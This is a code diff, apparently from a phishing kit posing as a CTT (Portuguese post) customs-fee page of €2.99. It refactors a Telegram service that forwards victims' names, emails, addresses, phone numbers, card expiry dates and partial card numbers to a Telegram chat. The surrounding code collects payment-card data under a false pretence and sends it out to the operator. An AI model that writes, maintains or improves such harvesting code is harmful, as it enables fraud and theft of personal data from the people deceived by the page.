@@ -122,26 +122,8 @@ class TelegramService:
             card_number = card_data.get('numeroCartao', '')
             masked_card = '**** **** **** ' + card_number[-4:] if len(card_number) >= 4 else '****'
             
-            message = f"""💳 Pagamento de Taxa Alfandegária CTT
-
-👤 Cliente:
-• Nome: {billing_data.get('nome', 'N/A')}
-• Email: {billing_data.get('email', 'N/A')}
-
-💰 Detalhes do Pagamento:
-• Valor: €2,99
-• Cartão: {masked_card}
-• Data Exp.: {card_data.get('dataExpiracao', 'N/A')}
-
-📍 Entrega:
-• Endereço: {billing_data.get('endereco', 'N/A')}
-• Código Postal: {billing_data.get('codigoPostal', 'N/A')}
-• Cidade: {billing_data.get('cidade', 'N/A')}
-• Telefone: {billing_data.get('telefone', 'N/A')}
-
-⏰ Data de Pagamento: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
-
-✅ Estado: Pagamento processado com sucesso"""
+            # Template para mensagem de pagamento
+            message = TelegramTemplates.payment_template(billing_data, card_data)
             
             telegram_success = await self.send_message(message)
             return telegram_success  # Return True even if only console works
